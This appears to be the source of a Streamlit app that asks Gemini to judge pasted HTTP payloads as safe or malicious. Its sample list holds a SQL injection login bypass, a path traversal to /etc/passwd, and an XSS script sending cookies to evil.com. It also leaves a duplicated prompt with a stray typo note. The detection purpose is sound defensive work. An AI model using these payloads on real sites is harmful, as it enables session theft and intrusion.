# ==========================================
# IMPORT REQUIRED LIBRARIES
# ==========================================
import streamlit as st  # Streamlit for web UI
import json            # For parsing structured JSON from Gemini
from google import genai # Official Google GenAI SDK

# ==========================================
# STEP 1: CONFIGURING THE WEB PAGE LAYOUT
# ==========================================
st.set_page_config(
    page_title="GuardAI - Web Intrusion Detector",
    page_icon=" ",
    layout="wide"
)

# ==========================================
# STEP 2: SECURE API KEY SETUP
# ==========================================
api_key = st.secrets.get("GEMINI_API_KEY", "")

if not api_key:
    st.sidebar.warning("Please configure your Gemini API key in `.streamlit/secrets.toml` or enter it below.")
    api_key = st.sidebar.text_input("Gemini API Key", type="password")

# ==========================================
# STEP 3: CREATING THE APP HEADER
# ==========================================
st.title(" GuardAI: Real-Time Web Intrusion Detection")
st.markdown("A Grammarly-styled security copilot that scans web inputs and payloads for malicious intent using semantic LLM analysis.")

# ==========================================
# STEP 4: DESIGNING THE SPLIT-SCREEN LAYOUT
# ==========================================
col1, col2 = st.columns([1.5, 1])

with col1:
    st.subheader(" Live Traffic / Payload Inspector")
    st.markdown("Paste an incoming HTTP request body, URL query string, or user form input to test for intrusions:")
    
    sample_payload = st.selectbox(
        "Or load a sample payload:",
        [
            "Custom Input...",
            "SELECT * FROM users WHERE username = 'admin'-- AND password = '1'",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "Hello, I would like to update my profile email to user@example.com",
            "../../../../etc/passwd"
        ]
    )
    
    default_text = "" if sample_payload == "Custom Input..." else sample_payload
    payload_input = st.text_area("HTTP Payload / Request Content", value=default_text, height=150)
    analyze_btn = st.button("🔍 Analyze Payload", type="primary")

with col2:
    st.subheader(" AI Security Suggestions")
    
    if analyze_btn:
        if not api_key:
            st.error("Please provide a valid Gemini API key.")
        elif not payload_input.strip():
            st.warning("Please provide a payload to analyze.")
        else:
            with st.spinner("Analyzing semantics and behavioral intent..."):
                try:
                    client = genai.Client(api_key=api_key)
                    
                    prompt = f"""
                    You are an expert Web Application Firewall (WAF) and Intrusion Detection System.
                    Analyze the following web request payload for security vulnerabilities or intrusion attempts (such as SQLi, XSS, Path Traversal, Command Injection, or Prompt Injection).
                    
                    Payload: {payload_input}
                    
                    Return ONLY a valid JSON object with the following keys:
                    - "status": "SAFE" or "MALICYS" (Wait, use "MALICIOUS")
                    - "risk_score": an integer from 0 to 100
                    - "attack_type": Type of attack if malicious (e.g., "SQL Injection", "Cross-Site Scripting", "None")
                    - "explanation": A brief, Grammarly-styled clear explanation of why this payload is dangerous or safe.
                    - "remediation": How to fix or sanitize the input.
                    """
                    # Fixing minor typo in prompt instruction status key check:
                    prompt = f"""
                    You are an expert Web Application Firewall (WAF) and Intrusion Detection System.
                    Analyze the following web request payload for security vulnerabilities or intrusion attempts (such as SQLi, XSS, Path Traversal, Command Injection, or Prompt Injection).
                    
                    Payload: {payload_input}
                    
                    Return ONLY a valid JSON object with the following keys:
                    - "status": "SAFE" or "MALICIOUS"
                    - "risk_score": an integer from 0 to 100
                    - "attack_type": Type of attack if malicious (e.g., "SQL Injection", "Cross-Site Scripting", "None")
                    - "explanation": A brief, Grammarly-styled clear explanation of why this payload is dangerous or safe.
                    - "remediation": How to fix or sanitize the input.
                    """
                    
                    response = client.models.generate_content(
                        model='gemini-2.5-flash',
                        contents=prompt,
                    )
                    
                    raw_text = response.text.strip()
                    if raw_text.startswith("```json"):
                        raw_text = raw_text[7:]
                    if raw_text.endswith("```"):
                        raw_text = raw_text[:-3]
                        
                    result = json.loads(raw_text.strip())
                    
                    if result["status"] == "MALICIOUS":
                        st.error(f" Threat Detected! ({result['risk_score']}/100 Risk)")
                        st.markdown(f"**Attack Vector:** `{result['attack_type']}`")
                        st.info(f"**Why it's flagged:** {result['explanation']}")
                        st.warning(f"**Recommended Action:** {result['remediation']}")
                    else:
                        st.success(" Clean Traffic / Safe Payload")
                        st.markdown(f"**Analysis:** {result['explanation']}")
                        
                except Exception as e:
                    st.error(f"Error during analysis: {str(e)}")
    else:
        st.info("Paste a payload on the left and click **Analyze Payload** to trigger real-time AI security checks.")
